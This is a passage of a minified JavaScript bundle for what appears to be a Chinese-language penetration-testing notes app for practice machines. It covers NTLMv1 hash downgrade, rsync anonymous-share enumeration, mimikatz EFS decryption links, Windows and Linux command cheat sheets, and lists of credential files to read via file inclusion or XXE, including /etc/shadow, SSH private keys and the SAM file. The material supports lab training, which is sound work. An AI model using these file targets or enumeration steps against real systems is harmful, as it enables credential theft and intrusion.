      \u300A-w\u300B\uFF0C\uFF1F\uFF1F\uFF1F
      \u300A-r\u300B\uFF0C\uFF1F\uFF1F\uFF1F
      \u300A-f\u300B\uFF0C\uFF1F\uFF1F\uFF1F
      \u300A-lm\u300B\uFF0C\u548C\u964D\u7EA7\u6709\u5173
          \u964D\u7EA7\u5230\u300AWindows XP/2003 \u6216\u66F4\u65E9\u300B

          \u52A0\u5165--lm\u53C2\u6570\u4E5F\u662F\u4E3A\u4E86\u56FA\u5B9A\u4E3A\u300A\u52A0\u5BC6\u65B9\u5F0F\u4E00\u300B
              \u5F97\u5230\u300ANTLMv1 hash\u300B
          \u4E0D\u52A0--lm\u53C2\u6570\u7684\u65F6\u5019\u5C31\u662F\u300A\u52A0\u5BC6\u65B9\u5F0F\u4E8C\u300B
              \u5F97\u51FA hash \u7684\u53EB\u300ANTLMv1-SSP Hash\u300B

  `]))),Object(u.a)(u0||(u0=Object(t.a)([`
  \u3010ActiveMQ\u3011\u3001
  \u30108161\u3011\u3001\u301061616\u3011

  ActiveMQ
      \u4ECB\u7ECD\uFF1A
          8161\u662Fmq\u81EA\u5E26\u7684\u7BA1\u7406\u540E\u53F0\u7684\u7AEF\u53E3\uFF1B61616\u662Fmq\u670D\u52A1\u9ED8\u8BA4\u7AEF\u53E3\u3002

  `]))),Object(u.a)(e0||(e0=Object(t.a)([`
  \u3010rtsp\u3011


  \uFF1F\uFF1F\uFF1F\uFF1F
  `]))),Object(u.a)(n0||(n0=Object(t.a)([`
  \u3010rsync\u3011

      \u4ECB\u7ECD\uFF1A
          Rsync \u662F\u7528\u4E8E\u5728\u670D\u52A1\u5668\u4E4B\u95F4\u4F20\u8F93\u6587\u4EF6\u7684\u6709\u7528\u5B9E\u7528\u7A0B\u5E8F\u3002Rsync \u7528\u4E8E\u5728\u672C\u5730\u590D\u5236\u6587\u4EF6\uFF0C\u4ECE\u8FDC\u7A0B rsync \u5B88\u62A4\u8FDB\u7A0B\u5230\u53E6\u4E00\u4E2A\u4E3B\u673A/\u53E6\u4E00\u4E2A\u8FDC\u7A0B shell\u3002

      \u7AEF\u53E3
          22\uFF08\u9ED8\u8BA4\u7AEF\u53E3\uFF09
              \u4E0E\u8FDC\u7A0B\u4E3B\u673A\u901A\u4FE1
          873\uFF1A
              \u662F rsync \u5B88\u62A4\u7A0B\u5E8F\u7684\u6B63\u5E38\u7AEF\u53E3

      \u547D\u4EE4\uFF1A

          \u67E5\u770B

              rsync --list-only {target_IP}::
                  --list-only  \u4E0D\u590D\u5236\uFF0C\u800C\u662F\u4EC5\u67E5\u770B

                  \u3010::\u3011\u540E\u9762\uFF0C\u53EF\u4EE5\u4E0D\u52A0\u76EE\u5F55

                  \u8FD4\u56DE\u4E2D\u5982\u679C\u6709\u3010public          Anonymous Share\u3011\uFF0C\u5219\u53EF\u4EE5\u5C1D\u8BD5\u3010\u533F\u540D\u767B\u5F55\u3011

          \u9274\u6743\uFF1A
              \u5982\u679C\u3010\u65E0\u5BC6\u7801\u3011\uFF0C\u5219\u4E0D\u7528\u3010\u4EFB\u4F55\u5BC6\u7801\u7B56\u7565\u3011
                  \u6B63\u5E38\u64CD\u4F5C\u5373\u53EF\u3002\uFF08\u3010\u5BC6\u7801\u7B56\u7565\u3011\u4E3ANone\uFF09

          \u590D\u5236

              rsync  [OPTION]  [USER@]HOST::SRC  [DEST]

              rsync  -zvr  <SRC\u76EE\u5F55>  <DEST\u76EE\u5F55>
                  -z: --compress \u4F7F\u7528\u538B\u7F29\u673A\u5236
                  -v: --verbose \u6253\u5370\u8BE6\u7EC6\u4FE1\u606F
                  -r: --recursive \u4EE5\u9012\u5F52\u6A21\u5F0F\u540C\u6B65\u5B50\u76EE\u5F55

          \u9009\u9879\uFF1A
              -r, --recursive: \u9012\u5F52\u6A21\u5F0FRecursive mode
              -l, --links: \u5C06\u7B26\u53F7\u94FE\u63A5\u5F53\u4F5C\u7B26\u53F7\u94FE\u63A5\u6587\u4EF6\u62F7\u8D1D, \u4E0D\u62F7\u8D1D\u7B26\u5408\u94FE\u63A5\u6307\u5411\u7684\u6587\u4EF6\u5185\u5BB9.
              -p, --perms: \u4FDD\u7559\u6587\u4EF6\u6743\u9650
              -t, --times: \u4FDD\u7559\u4FEE\u6539\u65F6\u95F4\u6233
              -g, --group: \u4FDD\u7559\u7528\u6237\u7EC4\u4FE1\u606F
              -o, --owner: \u4FDD\u7559\u7528\u6237\u4FE1\u606F(\u9700\u8981\u8D85\u7EA7\u7528\u6237\u6743\u9650)
              -D, \u76F8\u5F53\u4E8E --devices --specials \u7684\u7EC4\u5408, \u4FDD\u7559\u8BBE\u5907\u6587\u4EF6, \u4FDD\u7559\u7279\u6B8A\u6587\u4EF6.



  \uFF1F\uFF1F\uFF1F\uFF1F
  `]))),Object(u.a)(t0||(t0=Object(t.a)([`
  \u30105432\u3011\u3001
  \u3010postgre\u3011\u3001\u3010postgresql\u3011\u3001


  `,`


  `])),Fu)].concat(Object(l.a)(m0()));function m0(){var Xu=[Object(u.a)(a0||(a0=Object(t.a)([`
      \u3010binwalk\u3011\uFF0C\u53EF\u4EE5\u5206\u89E3\u3010Excel\u3011\u8868\u683C

      \u3010EFS\u3011
          \u8D44\u6599\uFF1A
              \u5982\u4F55\u7834\u89E3\uFF1Ahttps://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files

          \u4ECB\u7ECD\uFF1A
              Windows \u4E0A\u7684\u52A0\u5BC6\u6587\u4EF6\u7CFB\u7EDF( EFS )\u662FNTFS 3.0 \u7248\u4E2D\u5F15\u5165\u7684\u4E00\u9879\u529F\u80FD\uFF0C\u53EF\u63D0\u4F9B\u6587\u4EF6\u7CFB\u7EDF\u7EA7\u52A0\u5BC6\u3002
              \u8BE5\u6280\u672F\u4F7F\u6587\u4EF6\u80FD\u591F\u88AB\u900F\u660E\u5730\u52A0\u5BC6\uFF0C\u4EE5\u4FDD\u62A4\u673A\u5BC6\u6570\u636E\u514D\u53D7\u5BF9\u8BA1\u7B97\u673A\u8FDB\u884C\u7269\u7406\u8BBF\u95EE\u7684\u653B\u51FB\u8005\u7684\u4FB5\u5BB3\u3002
              \u89E3\u5BC6 EFS \u7684\u6838\u5FC3\u5C31\u662F\u5982\u4F55\u83B7\u53D6\u5230\u5BF9\u5E94\u7528\u6237\u7684\u8EAB\u4EFD\u51ED\u8BC1\u3002

      `]))),Object(u.a)(F0||(F0=Object(t.a)([`
      \u3010\u9776\u573A\u3011\u3001\u3010\u672A\u5B8C\u6210\u3011\u3001

  \u9488\u5BF9\u300AOpenAdmin\u300B\u9776\u573A\uFF0C\u975E\u5E38\u8BE6\u7EC6\u7684\u4E00\u7BC7\uFF1A
      \u4E2A\u4EBA\u611F\u89C9\uFF0C\u6C34\u5E73\u662F\u6700\u9AD8\u7684\uFF1Ahttps://ivanitlearning.wordpress.com/2020/09/24/hackthebox-openadmin/


  \u9488\u5BF9\u3010Poison\u3011\u9776\u573A\uFF1A
      poison\u653B\u51FB / \u4E2D\u6BD2\u653B\u51FB / \u65E5\u5FD7\u4E2D\u6BD2
          \u53C2\u8003\u8D44\u6599\uFF1A
              https://ivanitlearning.wordpress.com/2020/08/21/hackthebox-poison/

  `])))],$u=[Object(u.a)(l0||(l0=Object(t.a)([`
  \u3010\u7248\u672C\u3011\u3001\u3010version\u3011\u3001\u3010\u63A2\u6D4B\u3011\u3001\u3010\u4FE1\u606F\u3011

  \u8BF4\u660E\uFF0C\u5DF2\u7ECF\u601D\u8003\u4E86\u5F88\u591A\u4E86\uFF1A
  \u3010\u50F5\u5C40\u3011\u3001\u3010\u5361\u4F4F\u3011\u3001\u3010\u505A\u4E0D\u4E0B\u53BB\u3011\u3001\u3010\u6CA1\u6709\u3011\u3001\u3010\u6CA1\u6709\u6548\u679C\u3011\u3001\u3010\u6CA1\u6709\u5DE5\u4F5C\u3011\u3001\u3010\u6CA1\u6709\u6B63\u5E38\u5DE5\u4F5C\u3011\u3001\u3010\u6CA1\u6709\u663E\u793A\u3011\u3001\u3010\u601D\u8DEF\u3011\u3001\u3010\u5934\u7EEA\u3011\u3001
  \u3010\u9884\u6599\u3011\u3001\u3010\u9884\u6599\u4E4B\u5916\u3011\u3001\u3010\u610F\u6599\u3011\u3001\u3010\u610F\u6599\u4E4B\u5916\u3011\u3001
  \u3010\u65B9\u6CD5\u3011\u3001\u3010\u5E38\u7528\u3011\u3001\u3010\u975E\u5E38\u89C4\u3011\u3001\u3010\u8BE5\u8BD5\u3011\u3001\u3010\u5C1D\u8BD5\u3011\u3001\u3010\u5C1D\u8BD5\u8FC7\u3011\u3001
  \u3010\u660E\u9762\u3011\u3001\u3010\u6B7B\u8DEF\u3011\u3001\u3010\u4E00\u7B79\u83AB\u5C55\u3011\u3001\u3010\u65E0\u89E3\u3011\u3001\u3010\u632B\u8D25\u3011\u3001\u3010\u5931\u8D25\u3011\u3001\u3010\u675F\u624B\u65E0\u7B56\u3011\u3001
  \u3010\u7ECF\u9A8C\u3011\u3001\u3010\u603B\u7ED3\u3011\u3001\u3010\u79EF\u7D2F\u3011\u3001\u3010\u6709\u95EE\u9898\u3011\u3001
  \u3010\u592A\u96BE\u3011\u3001\u3010\u96BE\u3011\u3001\u3010\u505A\u4E0D\u51FA\u3011\u3001
  \u3010\u70E6\u8E81\u3011\u3001\u3010\u6211\u8BE5\u3011\u3001\u3010\u6211\u5E94\u8BE5\u3011\u3001\u3010\u600E\u4E48\u529E\u3011\u3001\u3010why\u3011\u3001\u3010\u4E0D\u5E94\u8BE5\u3011\u3001\u3010\u4E0D\u80FD\u89E3\u51B3\u3011\u3001
  \u3010\u6709\u89E3\u3011\u3001\u3010\u5E0C\u671B\u3011\u3001\u3010\u7834\u7EFD\u3011\u3001\u3010\u51FA\u8DEF\u3011\u3001
  \u3010\u5C3D\u529B\u3011\u3001\u3010\u6700\u540E\u3011\u3001\u3010\u6700\u540E\u4E00\u6B21\u3011\u3001
  \u3010\u778E\u8BD5\u3011\u3001\u3010\u778E\u649E\u3011\u3001\u3010\u778E\u3011
  \u3010\u522B\u4EBA\u3011\u3001\u3010\u95EE\u522B\u4EBA\u3011\u3001

  `,"  ",`

  \u8FD9\u91CC\uFF0C\u6709\u975E\u5E38\u9A73\u6742\u7684\u4E00\u5757\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\u5F88\u591A\u4E0D\u53EF\u9884\u671F\u7684\u95EE\u9898

  \u66FE\u7ECF\u72AF\u8FC7\u7684\u9519\u8BEF\uFF1A
      1. \u300Avsftpd 2.3.4\u300B
          \u6211\u76F4\u63A5\u5FD8\u8BB0\u4E86\u7248\u672C
              \u5176\u5B9E\uFF0C\u7F51\u4E0ACVE\u5F88\u591A
              metasploit\u4E5F\u975E\u5E38\u660E\u663E\uFF01

  `])),yu,nu.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C)];return[].concat(Xu,$u)}var o0=ve.a._\u7EDF\u4E00\u8FDB\u884C\u63D0\u53D6____\u6839\u636E\u65B9\u6846\u6B63\u5219____\u62FF\u5230\u5FC5\u8981\u7684\u6240\u6709\u8D44\u6599\u540E(i0),C0=o0._\u6B63\u5219\u5173\u952E\u5B57_BeanMap,B0=o0._\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr,A0=(E0=Object(m.a)(),E0(r0=(c0=Je=function Xu(){Object(S.a)(this,Xu)},Je._\u6B63\u5219\u5173\u952E\u5B57_BeanMap=C0,Je._\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr=B0,c0))||r0),s0=function($u){var ne=$u.flag_personalText,ze=ne===void 0?!0:ne,Ve=$u._defaultOption_arr;return e.a.createElement(e.a.Fragment,null,e.a.createElement(Z.a,{cfgType:"\u81EA\u52A8\u5B57\u7B26\u4E32\u65B9\u5F0F",\u81EA\u52A8Helper_instance:A0,showHeaders:!1,defaultOption_arr:Ve!=null?Ve:[],enable\u62FC\u97F3\u641C\u7D22:Be.c.\u6E17\u900F\u9776\u673A_\u81EA\u52A8,additionDescription:ze&&e.a.createElement(e.a.Fragment,null,e.a.createElement("h1",null,"\u2014\u2014\u4EBA\u7684\u601D\u60F3\uFF0C\u4F18\u5148\u662F\u3010\u7CFB\u7EDF\u5316\u3011\u7684\uFF1B\u4F46\u504F\u504F\uFF0C\u6709\u4E9B\u65F6\u5019\u5C31\u662F\u3010\u53BB\u7CFB\u7EDF\u5316\u3011\u7684\u3002\u6240\u4EE5\u6709\u4E86\u6B64\u54C1"),e.a.createElement("h2",null,"\u8FD9\u4E2A\u662F\u3010\u5F00\u95E8\u94A5\u5319\u3011\uFF0C\u662F\u9002\u5408\u521D\u5B66\u8005\u7528\u7684\uFF0C\u800C\u4E0D\u662F\u7ED9\u6210\u719F\u8005\u7528\u7684\u3002 \u8BB0\u5F55\u300A\u7075\u5149\u4E00\u95EA\u300B(\u6345\u7834\u4E00\u5C42\u7A97\u6237\u7EB8)\u3001\u82E6\u5FC3\u5B64\u8BE3"),e.a.createElement("h2",null,"\u53EF\u4EE5\u4F5C\u4E3A\u4E00\u4E2A\u3010\u7D22\u5F15\u3011\uFF0C\u4E32\u8054\u3001\u67E5\u627E\u3010Web\u9879\u76EE\u3011\u4E2D\u6240\u6709\u7684\u5185\u5BB9\uFF1B\u5E76\u4E14\u6765\u4EE3\u66FF\u3010\u91D1\u5C71\u6587\u6863\u3011\u7684\u3010\u8868\u683C\u7D22\u5F15\u3011\u3002"),e.a.createElement("h2",null,"\u4F46\u662F\uFF0C\u5BF9\u4E8E\u3010\u6E17\u900F\u3011\uFF0C\u521D\u5B66\u8005\u548C\u6210\u719F\u8005\uFF0C\u90FD\u9002\u7528\u8FD9\u4E00\u5957\u4F53\u7CFB\u3002 (\u53EF\u80FD\u6E17\u900F\u4E1A\u5185\uFF0C\u6742\u7684\u90A3\u4E00\u90E8\u5206\uFF0C\u786E\u5B9E\u90FD\u662F\u7C7B\u4F3C\u521D\u5B66\u8005\u4E00\u6837\u5C42\u6B21\u7684)"),e.a.createElement("h2",null,"\u6210\u719F\u8005\uFF0C\u5E94\u8BE5\u6574\u7406\u6210\u3010\u53C2\u8003\u8D44\u6599\u3011\u3001\u3010\u77E5\u8BC6\u5316\u4F53\u7CFB\u3011\uFF0C\u8054\u63A5\u5230\u3010\u6761\u76EE\u6700\u540E\u3011\u3002Electron\u672C\u5730")),selectTimes\u5404\u9879\u9009\u4E2D\u6B21\u6570_\u542B\u72EC\u4E00\u65E0\u4E8CID_cfg:{minTime__\u9ED8\u8BA4\u503C2:5,cp_key____\u89C6\u4E3A\u72EC\u4E00\u65E0\u4E8CKey:"\u6E17\u900F\u9776\u673A_\u81EA\u52A8____\u5BF9\u4E8E_\u5B8C\u7F8E_\u7A33\u6001_\u7684\u6301\u7EED\u63A2\u7D22____\u7591\u96BE\u6742\u75C7_\u641C\u7D22",default_map:{nmap:10,express:10}}}))},D0=d.a=s0},Pvr8:function(H,d,n){"use strict";n.d(d,"a",function(){return m});var S=n("/zsF"),t=n("PArb"),l=n("k1fw"),r=n("q1tI"),e=n.n(r),u={A:n("CIs/"),B:n("XDDu"),C:n("jR+D")},m=function(F){var p=F.type,I=F.widthPx,g=I===void 0?75:I,c=F.coverPosition,h=F.style,w=F.orientation,a=w===void 0?"center":w;return e.a.createElement(t.a,{orientation:a,style:Object(l.a)({},h)},e.a.createElement("img",{style:{width:"".concat(g,"px"),height:"".concat(g,"px"),borderRadius:"50%",objectFit:"cover",objectPosition:c?"0%    ".concat(c,"%"):void 0},src:u[p],alt:""}))}},QL8i:function(H,d,n){"use strict";n.r(d),n.d(d,"\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper",function(){return F}),n.d(d,"\u5E38\u89C1\u9690\u79C1\u6587\u4EF6_\u654F\u611F\u6587\u4EF6_\u91CD\u8981\u914D\u7F6E\u6587\u4EF6_Helper",function(){return p}),n.d(d,"Windows_\u624B\u518C",function(){return c});var S=n("tJVT"),t=n("fWQN"),l=n("q1tI"),r=n.n(l),e=n("/qoP"),u=n("ysNt"),m=n("jJ7j"),E=u.l.singleATag_blank,F=function h(){Object(t.a)(this,h)};F.\u5FEB\u901F\u5B66\u4E60\u65B9\u6848={Linux\u65B9\u6CD5:`
              \u3010explainshell.com\u3011\uFF0C\u4ECE\u539F\u7406\u89E3\u6790\u3010\u5404\u4E2Ashell\u547D\u4EE4\u3011\u7684\u3010\u9009\u9879\u3011
                  \u4EC5Linux\u53EF\u7528

              \u5728\u7EBF\u67E5\u8BE2\u547D\u4EE4\uFF1A
                  \u3010\u547D\u4EE4\u884C\u3011
                      curl cht.sh
                          \u5F97\u5230\u57FA\u672C\u8BF4\u660E
                      curl cht.sh/<\u5177\u4F53\u547D\u4EE4>
                          \u7ED9\u51FA\u8BE6\u7EC6\u7528\u6CD5\uFF0C\u548Cexample

                  \u3010\u5728\u7EBF\u7F51\u7AD9\u3011
                      https://tldr.ostera.io/<\u547D\u4EE4\u540D\u79F0>
    `,Windows_PowerShell\u65B9\u6CD5:`

              \u6682\u65F6\u6CA1\u6709\u627E\u5230

    `},F.wget={Linux\u65B9\u6CD5:`
                  wget

                  \u547D\u4EE4\uFF1A
                      wget  <url\u5730\u5740>  -outfile  <\u4FDD\u5B58\u8DEF\u5F84>

                  \u5E38\u7528\u9009\u9879
                      \u3010-o\u3011\uFF0C\uFF08--output-file\uFF09
    `,Windows_PowerShell\u65B9\u6CD5:`
                  wget

                  \u8D44\u6599\uFF1A
                      \u5B98\u65B9\u6587\u6863 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2

                  \uFF08\u53C8\u53EB\u505A \u3010Invoke-WebRequest\u3011 \uFF09

                  wget  <url\u5730\u5740>  -outfile  <\u4FDD\u5B58\u8DEF\u5F84>

                  \u5E38\u89C1\u9009\u9879\uFF1A
                      \u3010-outfile\u3011
                          \u6307\u5B9A\u3010\u54CD\u5E94\u6B63\u6587\u3011\u7684\u3010\u8F93\u51FA\u6587\u4EF6\u3011\uFF0C\u7684\u3010\u4FDD\u5B58\u8DEF\u5F84\u3011\u3002

    `},F.whoami={Linux\u65B9\u6CD5:`
                  whoami

    `,Windows_PowerShell\u65B9\u6CD5:`
                  whoami

                  \u65E0\u53C2\u6570\uFF0C\u57FA\u672C\u67E5\u8BE2

                  whoami  /priv
                      \u67E5\u770B\u5F53\u524D\u7528\u6237\uFF0C\u6743\u9650

                      \u5177\u4F53\u53EF\u89C1\u300A\u63D0\u6743_\u5B50\u6A21\u5757\u300B

    `},F.cd={Linux\u65B9\u6CD5:`
                  cd
                      123
    `,Windows_PowerShell\u65B9\u6CD5:`
                  cd
                      cd  <\u76EE\u5F55>

                      cd  <\u76D8\u7B26>:                          \u7ED3\u5C3E\u7684\u3010\u53CD\u659C\u6760\u3011\uFF0C\u5FC5\u987B\u8981\u6709


    `},F.strings={Linux\u65B9\u6CD5:`
                      strings
                          \u67E5\u770B\u3010\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011\u5185\u5BB9

                          \u5E38\u7528\u9009\u9879\uFF1A
                              \u3010-e\u3001-e<\u7F16\u7801\u4EE3\u53F7>\u3011
                                  \u6307\u5B9A\u8981\u67E5\u627E\u7684\u5B57\u7B26\u7684\u3010\u7F16\u7801\u3011\u3002

                                  \u53C2\u8003\u8D44\u6599\uFF1A
                                      \u8FD9\u4E2A\u8BA9\u6211\uFF0C\u4E86\u89E3\u4E86\u590D\u5408\u5F62\u5F0F\uFF1Ahttps://stackoverflow.com/questions/51367491/linux-strings-command-with-el-option-to-a-binary-file-and-how-to-replace-the

                                  \u4E3E\u4F8B\uFF1A
                                      strings  -el  <\u5177\u4F53\u6587\u4EF6>

                                  \u5E38\u89C1\u7F16\u7801\u4EE3\u53F7\uFF1A
                                      \u3010s\u3011\uFF0C\u5355 7 \u4F4D\u5B57\u8282\u5B57\u7B26\uFF08ASCII\u3001ISO 8859 \u7B49\uFF0C\u9ED8\u8BA4\u503C\uFF09
                                      \u3010S\u3011\uFF0C\u5355 8 \u4F4D\u5B57\u8282\u5B57\u7B26\uFF0C
                                      \u3010b\u3011\uFF0C16 \u4F4D\u53CC\u5B57\u8282\u5E8F
                                      \u3010l\u3011\uFF0C16-\u4F4D\u5C0F\u7AEF
                                      \u3010B\u3011\uFF0C32 \u4F4D\u5927\u7AEF
                                      \u3010L\u3011\uFF0C32 \u4F4D\u5C0F\u7AEF\u3002\u7528\u4E8E\u67E5\u627E\u5BBD\u5B57\u7B26\u4E32\u3002
                                      \uFF08\u4F8B\u5982\uFF0C l\u548Cb\u9002\u7528\u4E8E Unicode UTF-16/UCS-2 \u7F16\u7801\uFF09\u3002
    `,Windows_PowerShell\u65B9\u6CD5:`

                  strings           (PowerShell\u4E0B)
                      \u548CLinux\u7684\u547D\u4EE4\u7C7B\u4F3C

                  strings64.exe
                      123
                      cmd /c "strings64.exe -accepteula firefox.exe_191129_211531.dmp > firefox.exe_191129_211531.txt"

    `};var p=function h(){Object(t.a)(this,h)};p.Linux=Promise.all([Promise.resolve().then(n.bind(null,"+/qY"))]).then(function(h){var w=Object(S.a)(h,1),a=w[0];return r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                  \u547D\u4EE4\u75D5\u8FF9
                      .bash_history

                  \u91CD\u8981\u6587\u4EF6
                      \u53EF\u4EE5\u53C2\u8003\uFF0C\u4E0B\u65B9 \u3010Linux\u5E38\u89C1\u6307\u4EE4\u3011
                      \u5E38\u7528\u547D\u4EE4\uFF1A
                          cat  *  |  grep  -i  <\u76EE\u6807\u5173\u952E\u8BCD>*

                      \u6E90\u7801\u6587\u4EF6
                          \u3010.php\u6587\u4EF6\u3011\uFF0C\u5305\u542B\u6E90\u7801\u3001\u914D\u7F6E\u4FE1\u606F\u3001\u8D26\u53F7\u5BC6\u7801\uFF0C\u7B49

                      \u8D26\u53F7\u5BC6\u7801\u6587\u4EF6
                          /etc/passwd
                              \u53EF\u4EE5\u5728\u8FD9\u91CC\uFF0C\u641C\u7D22\u3010\u4E4B\u524D\u6709\u9047\u5230\u7684\u7528\u6237\u540D\u3011
                                  \u5982  \u4E4B\u524D\u627E\u5230\u4E86robert

                          \u3010.htpasswd\u3011
                              \u5728\u3010/var/www\u3011\u4E0B\uFF0C\u53EF\u80FD\u6709\u5BC6\u7801

                              Apache\u76F8\u5173

                      \u56FA\u5B9A\u4F4D\u7F6E\u6587\u4EF6
                          \u7ECF\u5E38\uFF0C\u53EF\u4EE5\u7528\u4E8E\u68C0\u6D4B  \uFF08\u5305\u62EC\u3010\u6587\u4EF6\u5305\u542B\u3011\u3001\u3010\u6587\u4EF6\u8BFB\u53D6\u3011\u7B49\u529F\u80FD\uFF09
                              \u4E0A\u6587\u6240\u8BF4\u7684\u3010/etc/passwd\u3011
                              \u3010/etc/shadow\u3011
                              \u3010/etc/my.cnf\u3011
                              \u3010/etc/hosts\u3011
                              \u3010~/.bash_history\u3011
                              \u3010/root/.bash_history\u3011

                      \u3010\u5185\u5BB9\u8FC7\u6EE4\u3011
                          \u5E26\u3010\u4EE5\u4E0B\u5185\u5BB9\u3011\u7684\u6587\u4EF6\u3002
                              shadow*
                                  \uFF08glob\u901A\u914D\u7B26  *\u53F7\u4E0D\u80FD\u653E\u524D\u9762\uFF09

                      \u7528\u6237\u4E2A\u4EBA\u6587\u4EF6
                          \u3010cd  ~\u3011
                              /\u7528\u6237\u76EE\u5F55/.ssh
                                  \u7ECF\u5E38\uFF0C\u6709\u4E00\u4E9B\u79C1\u94A5\u3001\u516C\u94A5  \u4E4B\u7C7B\u7684

                      \u914D\u7F6E\u6587\u4EF6\uFF08\u53EF\u80FD\u548C\u3010CMS\u3011\u4E4B\u7C7B\u7684\u76F8\u5173\uFF09
                          /etc/apache2/sites-enabled/internal.conf
                              \u3010Apache\u3011\u7684\u5185\u7F51\u670D\u52A1\u5668\uFF0C\u6587\u4EF6


      `,Object(e.d)({\u667A\u80FD\u6B65\u9AA4_cfg:a.Linux\u5E38\u89C1\u6307\u4EE4_cfg_\u4E8C\u7EA7\u624B\u518C})))}),p.Windows=r.a.createElement(r.a.Fragment,null,`
                  \u547D\u4EE4\u75D5\u8FF9
                      ConsoleHost_history.txt
                          \u4F4D\u4E8E\u3010  C:\\Users\\<\u7528\u6237\u540D>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\  \u3011

                  \u91CD\u8981\u6587\u4EF6

                      \u56FA\u5B9A\u4F4D\u7F6E\u6587\u4EF6
                          \u7ECF\u5E38\uFF0C\u53EF\u4EE5\u7528\u4E8E\u68C0\u6D4B  \uFF08\u5305\u62EC\u3010\u6587\u4EF6\u5305\u542B\u3011\u3001\u3010\u6587\u4EF6\u8BFB\u53D6\u3011\u7B49\u529F\u80FD\uFF09
                              \u3010C:\\windows\\system32\\drivers\\etc\\hosts\u3011
                              \u3010c:\\windows\\win.ini\u3011
                              \u3010c:\\boot.ini\u3011
                              \u3010C:\\Windows\\repair\\sam\u3011
                                  \u5B58\u50A8\u7CFB\u7EDF\u521D\u6B21\u5B89\u88C5\u7684\u5BC6\u7801
                              \u3010C:\\Windows\\my.ini\u3011
                                  Mysql\u914D\u7F6E\u4FE1\u606F


                      \u3010.ssh\u3011\u6587\u4EF6
                          \u53EF\u4EE5\u901A\u8FC7\u3010\u83B7\u53D6\u7528\u6237\u540D\u3011\uFF0C\u7136\u540E\u8FDB\u884C\u62FC\u63A5\uFF0C\u5F97\u5230

                          \u573A\u666F\uFF1A
                              \u7ECF\u5E38\u53EF\u7528\u5728  \u3010XXE\u3011\u3001  \u7B49\u73AF\u8282\u3002

                          \u76EE\u5F55\uFF1A\u3010C:\\users\\<\u7528\u6237\u540D>\\.ssh\\\u3011
                          \u6587\u4EF6\uFF1A
                              \u3010C:\\users\\<\u7528\u6237\u540D>\\.ssh\\id_rsa\u3011

                      \u7528\u6237\u76EE\u5F55
                          \u3010C:\\Users\\<\u7528\u6237\u540D>\\\u3011
                              \u7528\u6237\u540D\uFF0C\u901A\u5E38\u53EF\u4EE5\u662F\uFF1A
                                  Administrator

                              \u5E38\u89C1\u76EE\u5F55\uFF1A
                                  \u3010Desktop\\\u3011

  `);var I={name:"\u3010Windows\u3011\u5E38\u89C1\u3010\u6307\u4EE4\u3011",desc:r.a.createElement(r.a.Fragment,null),steps:[{name:"\u901F\u67E5\u624B\u518C\u3001\u5FEB\u901F\u5B66\u4E60\u624B\u518C",content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(r.a.createElement("h1",null,"\u65B9\u4FBF\u7684\u901F\u67E5\u624B\u518C"),F.\u5FEB\u901F\u5B66\u4E60\u65B9\u6848.Windows_PowerShell\u65B9\u6CD5))},{name:"\u3010cmd\u3011 \u7EC8\u7AEF",desc:r.a.createElement(r.a.Fragment,null,"\u57FA\u672C\u7684"),steps:[{name:"\u7F51\u7EDC\u3001\u8FDB\u7A0B\u3001\u7AEF\u53E3",content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u68C0\u67E5\u7AEF\u53E3\u5360\u7528\uFF0C\u5E76\u5173\u95ED\u3010\u5360\u7528\u7AEF\u53E3\u3011\u7684\u3010\u8FDB\u7A0B\u3011
              netstat -aon|findstr "8081"
                      \uFF08  \u6700\u540E\u4E00\u5217\uFF0C\u662F\u3010PID \u8FDB\u7A0B\u7F16\u53F7\u3011  \uFF09
              tasklist|findstr "9088"
                      \u5173\u95ED\u8FDB\u7A0B

              \u8D44\u6599\uFF1A    Windows\u4E0B\u5982\u4F55\u67E5\u770B\u67D0\u4E2A\u7AEF\u53E3\u88AB\u8C01\u5360\u7528 | \u83DC\u9E1F\u6559\u7A0B    https://www.runoob.com/w3cnote/windows-finds-port-usage.html

          \u67E5\u770B\u7F51\u7EDC

              ip  -a

              ipconfig


              netstat
                  netstat  -ano
                      \u67E5\u8BE2\u3010\u7AEF\u53E3\u60C5\u51B5\u3011

                      netstat  -aon  |  findstr  <\u7AEF\u53E3\u540D>
                          \u67E5\u8BE2\uFF0C\u5E76\u8FC7\u6EE4\u6307\u5B9A\u3010\u7AEF\u53E3\u3011

                  netstat  -tulpn

                  netstat  -alnp

          \u8FDB\u7A0B\u64CD\u4F5C
              taskkill  /F  /pid  <\u8FDB\u7A0BID>
                  \u5F3A\u884C\u5173\u95ED\uFF0C\u67D0\u4E2A\u8FDB\u7A0B

            `))},{name:"\u7528\u6237\u3001\u7528\u6237\u7EC4\u3001\u57DF",content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u67E5\u770B\u7528\u6237\u4FE1\u606F

              whoami
                `,F.whoami.Windows_PowerShell\u65B9\u6CD5,`
              \u5217\u4E3E\u672C\u673A\u7528\u6237\uFF1A
                  net  user
                      net  user  <\u7528\u6237\u540D>

                      net  user  <\u7528\u6237\u540D>  <\u5BC6\u7801>  /add

              \u5217\u4E3E\u7EC4\uFF1A
                  net  localgroup             \uFF08\u8FD8\u4E0D\u592A\u786E\u5B9A\u8FD9\u4E2A\uFF09
                      net  localgroup  <\u7EC4\u540D>  <\u7528\u6237\u540D>  /add  \uFF08\u8FD8\u4E0D\u592A\u786E\u5B9A\u8FD9\u4E2A\uFF09
              `))},{name:"\u76EE\u5F55\u3001\u6587\u4EF6",content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
